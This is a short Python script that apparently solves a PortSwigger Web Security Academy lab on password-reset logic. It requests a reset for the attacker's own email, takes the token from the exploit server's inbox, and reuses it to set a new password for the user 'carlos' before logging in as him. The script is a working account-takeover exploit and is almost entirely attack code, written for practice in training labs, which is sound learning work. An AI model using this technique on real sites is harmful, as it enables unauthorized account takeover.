import requests
import re


url = "https://[].web-security-academy.net/" # change this
url_exploit = "https://exploit-[].exploit-server.net/" # change this

response = requests.get(url_exploit+"email")
email = re.search(r'[\w.+-]+@[\w-]+\.[\w.-]+', response.text).group(0)
# print(email)

requests.post(url+"forgot-password", data={"username": email})
response = requests.get(url_exploit+"email")

pattern = r"temp-forgot-password-token=(?:[A-Za-z0-9+/]{4}){8}"
token = re.findall(pattern, response.text)[0].split("=")[1]

url_reset = url+"forgot-password?temp-forgot-password-token="+token
requests.post(url_reset, data={"temp-forgot-password-token": token, "username": "carlos", "new-password-1": "a", "new-password-2": "a"})
requests.post(url+"login", data={"username": "carlos", "password": "a"})

print("solved :)")
